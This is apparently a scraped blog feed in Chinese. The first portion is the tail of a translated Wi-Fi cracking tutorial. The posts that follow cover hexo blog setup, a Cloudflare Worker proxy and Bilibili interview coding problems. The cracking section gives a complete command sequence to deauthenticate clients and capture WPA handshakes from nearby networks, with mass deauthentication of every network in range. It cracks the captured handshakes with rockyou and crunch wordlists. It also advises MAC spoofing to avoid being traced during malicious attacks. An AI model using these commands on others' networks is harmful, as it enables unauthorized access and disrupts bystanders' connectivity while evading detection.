mon0\n\n发送了解除认证数据包后，回到你的 airodump-ng 进程，运气好的话你现在应该看到右上角：[WPA握手：9C：5C：8E：C9：AB：C0。 现在你已经捕获了握手，你应该准备好破解网络密码。\n命令列表下面列出了破解WPA/WPA2网络所需的所有命令，以最少的解释为依据。\n123456789101112131415161718192021222324252627# 将你的设备设置成监测模式airmon-ng start wlan0# 监听附近所有的 beacon 帧来获取目标 BSSID 以及信道airodump-ng mon0# 开始监听握手airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0# 选择性的对于连接的设备进行解除验证从而强制握手aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0########## 利用 aircrack-ng 破解密码... ########### 如果需要的话下载 134MB 的 rockyou.txt 字典文件curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt# 利用 w/ aircrack-ng 破解aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap########## 或者利用 naive-hashcat 破解密码 ########### 将 cap 转换成 hccapxcap2hccapx.bin capture/-01.cap capture/-01.hccapx# 利用 naive-hashcat 破解HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh\n\n附录非常欢迎对这篇教程进行回复，我已经添加了社区成员的建议和附加资料作为附录。它包括：\n在 MacOS/OSX 上捕获握手并且破解WPA密码\n利用 wlandump-ng 捕获从你周围每个网络捕获握手\n使用 crunch 即时生成 100+GB 的单词列表\n利用 macchanger 伪造你的 MAC 地址\n现在也提供中文版本附录。\n致谢这里提供的大部分信息都是从 Lewis Encarnacion 的绝妙的教程 中收集的。 感谢在 Aircrack-ng 和 Hashcat 上工作的优秀作者和维护者。\n非常感谢 neal1991 将本教程翻译成中文。另外也感谢 hiteshnayak305，enilfodne， DrinkMoreCodeMore，hivie7510，cprogrammer1994，0XE4，hartzell，zeeshanu，flennic，bhusang，tversteeg，gpetrousov，crowchirp 和 Shark0der，他们也在 Reddit 和 GitHub 上提供建议或帮助完善这篇文章。如果您有兴趣听取 WPA2 的一些建议替代方案，请参考 Hacker News 的一些重要讨论。\n附录A在本教程初次发布之后，来自互联网各个角落的一些人提出了意见和建议。 在努力保持原始教程简短而优美的基础上，我在这里介绍了有关他们精彩建议的信息，并添加了我自己的一些。 在这里，你可以找到以下信息：\n在 MacOS/OSX 上破解 WI-FI\n利用 wlandump-ng 抓取 handshake \n利用 crunch 生成单词列表\n利用 macchanger 保护你的身份\n在 MacOS/OSX 上破解 WI-FI非常感谢 @harshpatel991 提供本指南。下面会介绍如何使用 MacOS/OSX 自带的工具抓取 4-way handshake，然后再通过 naive-hashcat 来找出一个 WPA/WPA2 无线网络的密码。 此方法已在 OSX 10.10 和 10.12 上进行测试，不过也可能适用于其他版本。 像主教程一样，我们假设你有一个支持 监测模式 的无线网卡。我们在 2012 年上半年和 2015 年中期这两款 MacBook Pro 上进行了测试，并取得了巨大的成功。\n无线诊断工具幸运的是，OSX 配备了一套无线诊断工具。 要打开它们，请在按住键盘上 option 键的同时，点击菜单栏中的 Wi-Fi 图标。 然后选择“打开无线诊断...”\n测定目标网络信道打开无线诊断程序，单击窗口 &gt; 扫描。 找到目标网络，记录下其信道和宽度。\n抓取一个 4-way handshake在无线诊断程序打开的情况下，点击菜单栏中的窗口 &gt; 嗅探器。选择你在上一步中找到的信道和宽度。\n现在，你需要等待有设备连接到目标网络。如果你正在自己的网络上测试（使用者应当只在自己的网络上进行测试），将任意一个无线设备重新连接就可以抓取 handshake。\n当你感觉已经成功抓取 handshake 时，点击停止。\n根据你的操作系统版本，抓取的 .wcap 文件将被保存到桌面或/var/tmp/。\n将抓取的文件上传到 https://hashcat.net/cap2hccapx/ 就可以将其转换为 .hccapx 文件。 如果你成功的抓到了 handshake ，站点将开始下载一个.hccapx文件。 否则将不会提示下载。\n利用 naive-hashcat 破解密码123456789# 克隆 naive-hashcatgit clone https://github.com/brannondorsey/naive-hashcatcd naive-hashcat# 在 MacOS/OSX 上从原代码构建程序./build-hashcat-osx.sh# 下载 134MB rockyou字典文件curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt\n\n最后，运行 naive-hashcat.sh。将 handshake.hccapx 名称改成你从 hashcat.net 下载的文件名称。cracked.pot是输出文件名称。\n1HASH_FILE&#x3D;handshake.hccapx POT_FILE&#x3D;cracked.pot HASH_TYPE&#x3D;2500 .&#x2F;naive-hashcat.sh\n\n再次感谢 @harshpatel991，以及 phillips321 关于如何在 OSX 上构建 hashcat 的帖子。\n使用 wlandump-ng 抓取 handshake@enilfodne 提到 hachcat 社区有一个更棒的工具可以抓取 WPA 的 4-way handshakes。它是 hashcat 工具包的一部分，叫 hcxtools ，由 ZerBea 开发，名声已经超过了 airdump-ng。wlandump-ng 允许你一次性从每个附近的网络上全面抓取 handshake 信息，跳过 Wi-Fi 信道，以增加收集。\n12345678910111213141516# 克隆 hcxtoolsgit clone https://github.com/ZerBea/hcxtoolscd hcxtools# 构建并且安装# 你将可能需要apt来安装需要的依赖# https://github.com/ZerBea/hcxtools#requirementsmakesudo make install# 覆盖所有失去从附近接入点失去连接的客户端并且监听重新连接# 将wlan0替换成你的无线设备名称wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20 # 一旦你获得了抓取的文件，你可以利用以下命令将其转换成hashcat抓取格式cap2hccapx.bin capture.cap capture.hccapx\n\nwlandump-ng 命令行参数（使用 h 标志来获得完整列表）：\n-c 1：从通道 1 开始的 2.4Ghz 范围（将转到13）\n-t 60：每个通道停留 60s（实验值较低，默认值为 5）\n-d 100：发送 deauth 每 100 个信标帧\n-D 10：每隔 10 个信标帧发送解析数据包\n-m 512：内部缓冲区大小，对于低资源机器使用 512\n-b：激活信号到最后 10 个探测请求\n-r：如果循环在通道 1 上，则重置 deauthentication / detachosciation 计数器\n-s 20：显示 20 条状态行\n警告： 在大多数地方使用这个是不合法的。更多信息请参考这里。\nwlandump-ng 也提供了在被动模式下运行的选项，这时不会发送任何 deauth/disassociation 数据帧。 如果担心会影响到周围人使用网络（你应该是）时建议你使用这种模式。代价是你获得的 handshake 会少得多，不过用这种方法抓取不会被人察觉。\n12# 在被动模式下使用默认设置运行wlandump-ng -i wlan0 -o capture.cap -p -s 20\n\n使用 crunch 生成单词列表crunch 是使用给定字符串或模式的组合生成单词列表的工具。 我们可以使用 crunch 来即时生成密码列表，再通过管道传递给 aircrack-ng 而不必将单词列表保存到磁盘。\n12# 安装crunchsudo apt-get install crunch\n\n要想知道如何运行 crunch，可以从命令行运行（一旦开始发送密码，就可以按 ctrl-c）：\n123# 语法 8 8 是生成密码的最小长度和最大长度# 01234567890 是组合/排列构成密码的一组字符crunch 8 8 0123456789\n\n123456789101112131415161718Crunch 现在将生成以下数据量：900000000字节858 MB0 GB0 TB0 PBCrunch 现在将生成以下行数：10000000000000000000000010000000200000003000000040000000500000006000000070000000800000009...99999999\n\n我们可以将 crunch 的输出作为 aircrack-ng 的输入，使用它生成的密码作为我们的单词列表。 这里我们使用 crunch 特殊规则字符 % 来表示数字。 此命令尝试破解10位电话号码的 WPA 密码（使用 crunch 即时生成的 102GB 的号码）：\n1234# 我们也可以使用 -t \"@^%,\"  使用模式 '@' 替换小写 ',' － 替换大写# '%' －替换数字以及 '^' － 替换特殊字符# *************** 不要忘记最后的 '-'crunch 10 10 -t \"%%%%%%%%%%\" | aircrack-ng -a2 capture.cap -b 58:98:35:CB:A2:77 -w -\n\n利用 macchanger 保护你的个人信息每当您使用 Wi-Fi 进行任何远程恶意攻击时，最好将你 Wi-Fi 设备的 MAC 地址进行伪装，避免被人通过网络流量里的设备信息找到你。\n这是利用 macchanger 的一个小尝试：\n1234567891011121314# 下载 MAC changersudo apt-get install macchanger# 关闭设备sudo ifconfig wlan0 down# 改变 mac# -A 为有效的供应商分配一个随机的MAC w/a# -r 让它真正随机# -p 将其恢复到原始的硬件MACsudo macchanger -A wlan0# 启动设备sudo ifconfig wlan0 up\n\n如果你有多张无线网卡，最好把所有的设备都改一遍。 或者当你尝试抓取 handshake 时干脆把不用的设备都关掉，尽可能少地留下痕迹。 请注意，重启后伪装的设备信息会恢复。\n","thumbnail":"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/75057185_p0.jpg","plink":"https://gwliang.com/2020/01/24/wifi-cracking/"},{"title":"使用 Go 语言实现一个云剪切板（未开始）","date":"2019-11-22T10:32:56.000Z","date_formatted":{"ll":"2019年11月22日","L":"2019/11/22","MM-DD":"11-22"},"updated":"2019-11-29T10:41:40.755Z","content":"先把坑开了，到时候再填\n","thumbnail":"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/wallhaven-md3wd9.jpg","plink":"https://gwliang.com/2019/11/22/yong-go-shi-xian-yi-ge-yun-jian-qie-ban/"},{"title":"从零开始实现hexo博客的在线编辑（未完成）","date":"2019-11-19T01:18:16.000Z","date_formatted":{"ll":"2019年11月19日","L":"2019/11/19","MM-DD":"11-19"},"updated":"2019-11-28T02:42:39.384Z","content":"⚠ 本教程需要服务器（VPS），Serverless版本正在探索，请大家耐心等待\n前言我今年五月参加的微信小程序开发赛获得了全国三等奖，微信赠了我1k的优惠券\n\n\n不过这个优惠券只能购买没有优惠过的服务器，所以1k优惠券也是了了，最后在我的精打细算下，买了一年零三个月的服务器。买来不能闲置着不用啊，于是我准备构建一个在线写hexo的平台，这样就可以摆脱平台的束缚，在任意环境下都可以进行写作了。由于这个服务器是新购置的，所以我从零开始写一下相关的内容。\n配置相关环境Nignx配置Nignx是关键，虽然很俗，但是这个活不能不干。其实也可以有很多选择，比如Caddy，Apache（这年头个人搭建网站还有人用Apache吗，配置巨麻烦）\nDebian apt 自带的 Nginx 太老，可以通过更新源的方式来解决\n123echo deb http://nginx.org/packages/debian/ stretch nginx | sudo tee /etc/apt/sources.list.d/nginx.listwget http://nginx.org/keys/nginx_signing.key &amp;&amp; sudo apt-key add nginx_signing.key sudo apt update &amp;&amp; apt install nginx -y\n\n到这一部分就完成了最新稳定版的 Nginx 的安装。需要注意的是，这一步安装的 Nginx 和系统自带的 Nginx 的配置目录略有区别，可以用一下几个简单的命令修正：\n1234sudo mkdir /etc/nginx/&#123;sites-available,sites-enabled&#125;sudo mv /etc/nginx/conf.d/* /etc/nginx/sites-availablesudo rmdir -f /etc/nginx/conf.d/sudo perl -pi -e 's/conf.d/sites-enabled/g' /etc/nginx/nginx.conf\n当然这个没必要，我就没弄\n最后出现这个就是成功了\n\nNodeJSNodeJS是最重要的，没有Nginx也得有NodeJS，这是我们写博客的关键，Debian自带的NodeJS还是比较老的，推荐用 nvm 安装\n1curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.1/install.sh | bash\n然后关闭再打开终端，就可以用了\n我目前NodeJS最新版是12.13.0，输入\n1nvm install 12.13.0\n就安装了NodeJS 12.13.0版本\n\ngitgit 直接用 apt 安装就行了，这个不再赘述。\n1apt install git\n\n工作区配置把你的博客源文件上传Github为了多端同步，也为了防止服务器不好上传你的文件，这个时候就需要将你的博客的源文件文件上传到GitHub，由于Hexo会吃掉你博客的master分支，这个时候就需要先创建一个分支。在你博客源文件的文件夹下打开Git bash，输入下面的命令\n1git checkout -b inside\n这样就创建了一个inside分支，因为我这个博客的主题就是inside。然后git push到GitHub上，本地这边的工作就完成了。\n在服务器上把你的源代码clone下来由于服务器是全新的，我就按全新的来说，首先输入下面命令：\n12345git config --global user.name \"你GitHub的用户名\"git config --global user.email \"你GitHub注册时用的邮箱\"ssh-keygen -t rsa -C \"你GitHub注册时用的邮箱\"\n默认回车即可，然后输入cat /root/.ssh/id_rsa.pub，然后把输出的东西整个复制出来\n\n打开github，在头像下面点击settings，再点击SSH and GPG keys，新建一个SSH，Title随便。\n把刚才输出的一串复制到key里即可\n输入ssh -T git@github.com，问Are you sure you want to continue connecting (yes/no)?时输入yes，如果出现你的用户名，那就成功了。\n","plink":"https://gwliang.com/2019/11/19/implement-hexo-blog-online-editing-from-scratch/"},{"title":"Cloudflare Worker+jsproxy实现浏览器代理","date":"2019-11-04T12:54:38.000Z","date_formatted":{"ll":"2019年11月4日","L":"2019/11/04","MM-DD":"11-04"},"updated":"2019-11-29T10:41:38.322Z","content":"Cloudflare Worker+jsproxy实现浏览器代理访问谷歌简介CloudFlare Worker 是 CloudFlare 的边缘计算服务。开发者可通过 JavaScript 对 CDN 进行编程，从而能灵活处理 HTTP 请求。这使得很多任务可在 CDN 上完成，无需自己的服务器参与。使用jsproxy技术就可以轻松进行前端代理功能，同时没有任何费用。\n部署首页：https://workers.cloudflare.com\n注册，登陆，Start building，取一个子域名，Create a Worker。\n复制 index.js 到左侧代码框，Save and deploy。如果正常，右侧应显示首页。\n收藏地址框中的 https://xxxx.子域名.workers.dev，以后可直接访问。\n我进行了美化，效果图如下：\n\n计费后退到 overview 页面可参看使用情况。免费版每天有 10 万次免费请求，对于个人通常足够。\n如果不够用，可注册多个 Worker，在 conf.js 中配置多线路负载均衡。或者升级到 $5 的高级版本，每月可用 1000 万次请求（超出部分 $0.5/百万次请求）。\n修改配置默认情况下，静态资源从 https://etherdream.github.io/jsproxy 反向代理，可通过代码中 ASSET_URL 配置，从而可使用自定义的 conf.js 配置。\n存在问题WebSocket 代理尚未实现\n\n外链限制尚未实现\n\n未充分测试，以后再完善\n\n","thumbnail":"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/wallhaven-838p12.jpg","plink":"https://gwliang.com/2019/11/04/Cloudflare_Worker_jsproxy/"},{"title":"B站2019秋招编程题","date":"2019-10-23T12:21:53.000Z","date_formatted":{"ll":"2019年10月23日","L":"2019/10/23","MM-DD":"10-23"},"updated":"2019-11-17T00:48:45.195Z","content":"B站在牛客网（ https://www.nowcoder.com/test/16519291/summary ）\n上发了一套自己秋招的编程题，恰好今年被老师忽悠着去再参加一次蓝桥杯（我参加C++组，所以下面的题都是用C++做的，没用我熟悉的python），虽然那个比赛很水，但是还是要提高我的编程能力才是。于是准备做点题练习下，B站这个题挺好，题目很新颖（仅限题目描述），不过内容和那个比赛一样水，所以给大家解析下。\n1.扭蛋机 answer\n时间限制：1秒空间限制：32768K\n\n22娘和33娘接到了小电视君的扭蛋任务：\n一共有两台扭蛋机，编号分别为扭蛋机2号和扭蛋机3号，22娘使用扭蛋机2号，33娘使用扭蛋机3号。\n扭蛋机都不需要投币，但有一项特殊能力：\n扭蛋机2号：如果塞x（x范围为&gt;=0正整数）个扭蛋进去，然后就可以扭到2x+1个\n扭蛋机3号：如果塞x（x范围为&gt;=0正整数）个扭蛋进去，然后就可以扭到2x+2个\n22娘和33娘手中没有扭蛋，需要你帮她们设计一个方案，两人“轮流扭”（谁先开始不限，扭到的蛋可以交给对方使用），用“最少”的次数，使她们能够最后恰好扭到N个交给小电视君。\n输入描述:\n输入一个正整数，表示小电视君需要的N个扭蛋。\n\n输出描述:\n输出一个字符串，每个字符表示扭蛋机，字符只能包含&quot;2&quot;和&quot;3&quot;。\n\n输入例子1:\n10\n\n输出例子1:\n233\n\n思路有两种，一种是BFS，一种是通过二叉树（其实你看到2x+1和2x+2就差不多知道了），因为这个题是这样的：\n\n可以看到，n是奇数都是最后22扭的，n是偶数都是最后33扭的，那么我们就可以倒着找出最终的顺序。找到下一层之后返回上一层，如果是奇数就是(n-1)/2,偶数就是(n-2)/2，具体可自行验证。给出C++的示例代码：\n\n2.脸滚键盘 answer\n时间限制：1秒空间限制：32768K\n\nav394281 中，充满威严的蕾米莉亚大小姐因为触犯某条禁忌，被隙间妖怪八云紫（紫m……èi）按住头在键盘上滚动。\n同样在弹幕里乱刷梗被紫姐姐做成罪袋的你被指派找到大小姐脸滚键盘打出的一行字中的第 k 个仅出现一次的字。\n(为简化问题，大小姐没有滚出 ascii 字符集以外的字)\n输入描述:\n每个输入都有若干行，每行的第一个数字为k，表示求第k个仅出现一次的字。然后间隔一个半角空格，之后直到行尾的所有字符表示大小姐滚出的字符串S。\n\n输出描述:\n输出的每一行对应输入的每一行的答案，如果无解，输出字符串Myon~(请不要输出多余的空行）为了方便评测，如果答案存在且为c，请输出[c]\n\n输入例子1:\n2 misakamikotodaisuki3 !bakabaka~ bakabaka~ 1~2~9!3 3.1415926535897932384626433832795028841971693993751o582097494459211451488946419191919l91919hmmhmmahhhhhhhhhh7 www.bilibili.com/av170001\\\n1 111\n\n输出例子1:\n[d][9][l][7]Myon~\n\n这个题有几种思路，最简单的还是使用映射(map)，让出现的每个字符对应到0上。扫描整个字符串，如果碰到一个字符，就让他对应的数+1，同时记录每个字符出现的顺序。然后扫描记录的顺序，找到第k个对应数是1的字符。但是我们看到题目说的是不超过ASCII，所以直接用ASCII来映射就好了，给出示例C++代码：\n\n3.简单表达式计算 answer\n时间限制：1秒空间限制：32768K\n\n给定一个合法的表达式字符串，其中只包含非负整数、加法、减法以及乘法符号（不会有括号），例如7+3*4*5+2+4-3-1，请写程序计算该表达式的结果并输出；\n输入描述:\n输入有多行，每行是一个表达式，输入以END作为结束\n\n输出描述:\n每行表达式的计算结果\n\n输入例子1:\n7+3*4*5+2+4-3-12-3*1END\n\n输出例子1:\n69-1\n\n4.小A最多会新认识的多少人 answer\n时间限制：1秒空间限制：32768K\n\n小A参加了一个n人的活动，每个人都有一个唯一编号i(i&gt;=0 &amp; i&lt;n)，其中m对相互认识，在活动中两个人可以通过互相都认识的一个人介绍认识。现在问活动结束后，小A最多会认识多少人？\n输入描述:\n第一行聚会的人数：n（n&gt;=3 &amp; n&lt;10000）；第二行小A的编号: ai（ai &gt;= 0 &amp; ai &lt; n)；第三互相认识的数目: m（m&gt;=1 &amp; m\n&lt; n(n-1)/2）；第4到m+3行为互相认识的对，以&#39;,&#39;分割的编号。\n\n输出描述:\n输出小A最多会新认识的多少人？\n\n输入例子1:\n7561,03,14,15,36,16,5\n\n输出例子1:\n3\n\n这个题很明显的并查集，但是据其他人说用邻接表+BFS也能做，但是这里我就不尝试了，给出并查集（最后要记得减去小A本来就认识的人）的C++示例代码：\n\n5.山寨金闪闪 answer\n时间限制：3秒空间限制：262144K\n\n金闪闪死后，红A拿到了王之财宝，里面有n个武器，长度各不相同。红A发现，拿其中三件武器首尾相接，组成一个三角形，进行召唤仪式，就可以召唤出一个山寨金闪闪。（例如，三件武器长度为10、15、20，可以召唤成功。若长度为10、11、30，首尾相接无法组成三角形，召唤失败。）红A于是开了一个金闪闪专卖店。他把王之财宝排成一排，每个客人会随机抽取到一个区间[l,r],客人可以选取区间里的三件武器进行召唤（客人都很聪慧，如果能找出来合适的武器，一定不会放过）。召唤结束后，客人要把武器原样放回去。m个客人光顾以后，红A害怕过多的金闪闪愉悦太多男人，于是找到了你，希望你帮他统计出有多少山寨金闪闪被召唤出来。\n输入描述:\n第一行武器数量:n &lt;= 1*10^7第二行空格分隔的n个int，表示每件武器的长度。第三行顾客数量：m &lt;= 1*10^6后面m行，每行两个int l，r，表示每个客人被分配到的区间。（l&lt;r）\n\n输出描述:\n山寨金闪闪数量。\n\n输入例子1:\n51 10 100 95 10141 32 42 53 5\n\n输出例子1:\n3\n\n我知道这是《Fate》系列作品的衍生题目，我不玩游戏，但是咱也知道金闪闪是男的，为什么偷♂税男人啦。不过这个题很有说头，思路可以分为这几步：\n1，首先，判断三个正整数a,b,c是否能组成三角形，判断方法是：将abc升序排列，然后如果a+b&gt;c,则可以构成三角形。其次，判断一个区间[L,R]内是否能找到三个数使其构成三角形，可以将这R-L+1个元素取出并排序，然后从前往后三个三个判断。查询每次区间长度都在1~1e7之间，当然不能每次都暴力找，不然有1e6次查询，时间复杂度肯定爆炸，那么怎么处理呢？实际上，如果数一多，是非常容易构成三角形的，如果要刚好卡到边界，刚好不能构造成三角形（a+b==c），则要构造这样的数据：1，1，2，3，5，8......。\n巧了，其实就是斐波那契数列，题目的数据给出的数据在int范围内，然后我们发现大概在40多项的时候就不能构造出全都不满足构成三角形的数据了，下面是打表的出的结果。\n\nint 的范围最大是2的32次方，也就是4294967296，到48项就超了，所以区间超过47必出金闪闪\n所以，只要在给出的区间长度较大的，一定能构成三角形，区间长度较小的，则可以存下来排序后判断，下面给出C++示例代码：\n\n作者：高玩梁\nhttps://www.bilibili.com/read/cv3831139\n出处： bilibili\n6.比较两个版本字符串version1和version2 answer\n时间限制：1秒空间限制：32768K\n\n如果version1 &gt; version2 返回1，如果 version1 &lt; version2 返回-1，不然返回0.\n输入的version字符串非空，只包含数字和字符.。.字符不代表通常意义上的小数点，只是用来区分数字序列。例如字符串2.5并不代表二点五，只是代表版本是第一级版本号是2，第二级版本号是5.\n输入描述:\n两个字符串，用空格分割。每个字符串为一个version字符串，非空，只包含数字和字符.\n\n输出描述:\n只能输出1, -1，或0\n\n输入例子1:\n0.1 1.1\n\n输出例子1:\n-1\n\n7.精灵鼠从入口到出口的最少减少速度 answer\n时间限制：2秒空间限制：131072K\n\n猛兽侠中精灵鼠在利剑飞船的追逐下逃到一个n*n的建筑群中，精灵鼠从（0,0）的位置进入建筑群，建筑群的出口位置为（n-1,n-1），建筑群的每个位置都有阻碍，每个位置上都会相当于给了精灵鼠一个固定值减速，因为精灵鼠正在逃命所以不能回头只能向前或者向下逃跑，现在问精灵鼠最少在减速多少的情况下逃出迷宫？\n输入描述:\n第一行迷宫的大小: n &gt;=2 &amp; n &lt;= 10000；第2到n+1行，每行输入为以&#39;,&#39;分割的该位置的减速,减速f &gt;=1 &amp; f &lt; 10。\n\n输出描述:\n精灵鼠从入口到出口的最少减少速度？\n\n输入例子1:\n35,5,76,7,82,2,4\n\n输出例子1:\n19\n\n8.顺时针打印数字矩阵 answer\n时间限制：1秒空间限制：32768K\n\n给定一个数字矩阵，请设计一个算法从左上角开始顺时针打印矩阵元素\n输入描述:\n输入第一行是两个数字，分别代表行数M和列数N；接下来是M行，每行N个数字，表示这个矩阵的所有元素；当读到M=-1，N=-1时，输入终止。\n\n输出描述:\n请按逗号分割顺时针打印矩阵元素（注意最后一个元素末尾不要有逗号！例如输出“1，2，3”，而不是“1，2，\n3，”），每个矩阵输出完成后记得换行\n\n输入例子1:\n3 31 2 34 5 67 8 9-1 -1\n\n输出例子1:\n1,2,3,6,9,8,7,4,5\n\n9.写一段程序判断IP字符串是否属于内网IP answer\n时间限制：1秒空间限制：32768K\n\n从业 666 年的 BILIBILI 网络安全工程师 KindMo 最近很困惑，公司有一个业务总是受到 SSRF 攻击。请帮他写一个程序，判断输入的字符串是否属于内网IP，用于防御该漏洞。\n我们知道常见的内网IP有，127.0.0.1，192.168.0.1 等。\n输入描述:\n每次输入仅包含一个IP字符串，即一个测试样例\n\n输出描述:\n对于每个测试实例输出整数1或0，1代表True，即输入属于内网IP，0代表False，即输入不属于内网IP或不是IP字符串。\n\n输入例子1:\n42.96.146.169\n\n输出例子1:\n0\n\n10.给定一个整数数组,判断其中是否有3个数和为N answer\n时间限制：1秒空间限制：131072K\n\n给定一个整数数组,判断其中是否有3个数和为N\n输入描述:\n输入为一行逗号前为一个整数数组，每个元素间用空格隔开；逗号后为N\n\n输出描述:\n输出bool值True表示存在3个和为N的数False表示不存在3个和为N的数\\\n\n输入例子1:\n1 2 3 4 5,10\n\n输出例子1:\nTrue\n\n11.实现一个HTML语法检查器 answer\n时间限制：1秒空间限制：32768K\n\n实现一个HTML语法检查器。HTML语法规则简化如下：标签必须闭合，可以由开始和结束两个标签闭合，如&lt;div&gt;&lt;/div&gt;，也可以自闭合，\n如&lt;div /&gt;\n标签可以嵌套如&lt;div&gt;&lt;a&gt;&lt;/a&gt;&lt;/div&gt;或者 &lt;div&gt;&lt;a/&gt;&lt;/div&gt;，但是标签不能交叉：&lt;div&gt;&lt;a&gt;&lt;/div&gt;&lt;/a&gt;是不允许的标签里可以有属性\n如&lt;div id=&quot;a&lt;1&quot;&gt;&lt;/div&gt;\n属性的规则是name=&quot;任意非引号字符&quot;，多属性声明之间必须有空格，属性声明不符合规则时，整段HTML都算语法错误\n输入文本只会出现字母a-z和&lt;&gt;&quot;=\n请用任意语言实现一个HTML语法检查器函数，有语法错误返回1，没有语法错误返回0\n输入描述:\n一行，一个HTML字符串\n\n输出描述:\n有语法错误返回1，没有语法错误返回0\n\n12.孙悟空的徒弟 answer\n时间限制：3秒空间限制：131072K\n\n打败魔人布欧以后，孙悟空收了n个徒弟，每个徒弟战斗力各不相同。他教导所有的徒弟和体术，合体后战斗力为原战斗力相乘。任何两个徒弟都可以合体，所以一共有n*(n-1)/2种合体徒弟。有一天，他想考验一下孙悟天战斗力如何，希望在所有n*(n-1)/2种合体徒弟中选择战斗力第k高的，与孙悟天对战。可是孙悟空徒弟太多了，他已然懵逼，于是找到了你，请你帮他找到对的人。\n输入描述:\n第一行两个int。徒弟数量：n &lt;= 1*10^6；战斗力排名:k &lt;= n*(n-1)/2第二行空格分隔n个int，表示每个徒弟的战斗力。\n\n输出描述:\n战斗力排名k的合体徒弟战斗力。\n\n输入例子1:\n5 21 3 4 5 9\n\n输出例子1:\n36\n\n13.翻转链表 answer\n时间限制：1秒空间限制：32768K\n\n对于一个链表 L: L0→L1→…→Ln-1→Ln,将其翻转成 L0→Ln→L1→Ln-1→L2→Ln-2→…\n输入是一串数字，请将其转换成单链表格式之后，再进行操作\n输入描述:\n一串数字，用逗号分隔\n\n输出描述:\n一串数字，用逗号分隔\n\n输入例子1:\n1,2,3,4,5\n\n输出例子1:\n1,5,2,4,3\n\n14.ん...红茶？answer\n时间限制：1秒空间限制：131072K\n\n高贵的蕾米莉亚大小姐每天需要饮用定量 B 型血的红茶以保持威严，并且要分两杯在不同时段饮用。\n女仆长十六夜咲夜每天可以制作很多杯不同剂量 B 型血的红茶供蕾米莉亚大小姐饮用。\n某日，你和天才妖精琪露诺偷偷潜入红魔馆被咲夜抓住，要求在今日份的红茶中挑出所有满足大小姐要求的茶杯，否则……\n输入描述:\n每个样例有三行输入，第一行输入表示茶杯个数，第二行输入表示每份茶杯里的 B 型血剂量，第三行表示大小姐今天的定量\n\n输出描述:\n对每一个样例，输出所有可能的搭配方案，如果有多种方案，请按每个方案的第一杯 B 型血剂量的大小升序排列。如果无法找到任何一种满足大小姐的方案，输出&quot;NO&quot;(不包括引号)并换行。\n\n输入例子1:\n72 4 6 1 3 5 77\n\n输出例子1:\n1 62 53 4\n\n","plink":"https://gwliang.com/2019/10/23/2019bilibili/"},{"title":"高大上博客制作教程","date":"2019-10-05T12:24:22.000Z","date_formatted":{"ll":"2019年10月5日","L":"2019/10/05","MM-DD":"10-05"},"updated":"2020-01-14T12:22:56.555Z","content":"高大上博客制作教程安装Node.js首先下载稳定版Node.js，我这里给的是64位的。\n安装选项全部默认，一路点击Next。\n最后安装好之后，按Win+R打开命令提示符，输入node -v和npm -v，如果出现版本号，那么就安装成功了。\n添加国内镜像源如果没有梯子的话，可以使用阿里的国内镜像进行加速。\n1npm config set registry https://registry.npm.taobao.org\n\n安装Git为了把本地的网页文件上传到github上面去，我们需要用到分布式版本控制工具————Git[下载地址]。\n安装选项还是全部默认，只不过最后一步添加路径时选择Use Git from the Windows Command Prompt，这样我们就可以直接在命令提示符里打开git了。\n安装完成后在命令提示符中输入git --version验证是否安装成功。\n注册Github账号接下来就去注册一个github账号，用来存放我们的网站。大多数小伙伴应该都有了吧，作为一个合格的程序猿（媛）还是要有一个的。\n打开https://github.com/，新建一个项目，输入自己的项目名字，后面一定要加.github.io后缀。名称一定要和你的github名字完全一样，比如你github名字叫abc，那么仓库名字一定要是abc.github.io。\n然后项目就建成了，点击Settings，向下拉到最后有个GitHub Pages，点击Choose a theme选择一个主题。然后等一会儿，再回到GitHub Pages，在地址栏输入你的用户名.github.io就能看到你的主页了。\n具体可以看我的B站视频\n安装Hexo在合适的地方新建一个文件夹，用来存放自己的博客文件，比如我的博客文件都存放在D:\\study\\program\\blog目录下。\n在该目录下右键点击Git Bash Here，打开git的控制台窗口，以后我们所有的操作都在git控制台进行，就不要用Windows自带的控制台了。\n定位到该目录下，输入npm i hexo-cli -g安装Hexo。会有几个报错，无视它就行。\n安装完后输入hexo -v验证是否安装成功。\n然后就要初始化我们的网站，输入hexo init初始化文件夹，接着输入npm install安装必备的组件。\n这样本地的网站配置也弄好啦，输入hexo g &amp;&amp; hexo s打开本地服务器，然后浏览器打开http://localhost:4000/，就可以看到我们的博客啦\n按ctrl+c关闭本地服务器。\n连接Github与本地首先右键打开git bash，然后输入下面命令：\n123456789101112。打开博客根目录下的`_config.yml`文件，这是博客的配置文件，在这里你可以修改与博客相关的各种信息。修改最后一行的配置：```bashdeploy:  type: git  repository: https://github.com/gaowanliang/gaowanliang.github.io  branch: master\nrepository修改为你自己的github项目地址。\n写文章、发布文章首先在博客根目录下右键打开git bash，安装一个扩展npm i hexo-deployer-git。\n然后输入hexo new post &quot;文章标题&quot;，新建一篇文章。\n然后打开D:\\study\\program\\blog\\source\\_posts的目录，可以发现下面多了一个文件夹和一个.md文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。\n编写完markdown文件后，根目录下输入hexo g生成静态网页，然后输入hexo s可以本地预览效果，最后输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。\n绑定域名现在默认的域名还是xxx.github.io，是不是很没有牌面？想不想也像我一样弄一个专属域名呢，首先你得购买一个域名，xx云都能买，看你个人喜好了。\n以我的Cloudflare为例，如下图所示，添加这条解析记录：\n\n然后打开你的github博客项目，点击settings，拉到下面Custom domain处，填上你自己的域名，保存：\n\n这时候你的项目根目录应该会出现一个名为CNAME的文件了。如果没有的话，打开你本地博客/source目录，我的是D:\\study\\program\\blog\\source，新建CNAME文件，注意没有后缀。然后在里面写上你的域名，保存。最后运行hexo g、hexo 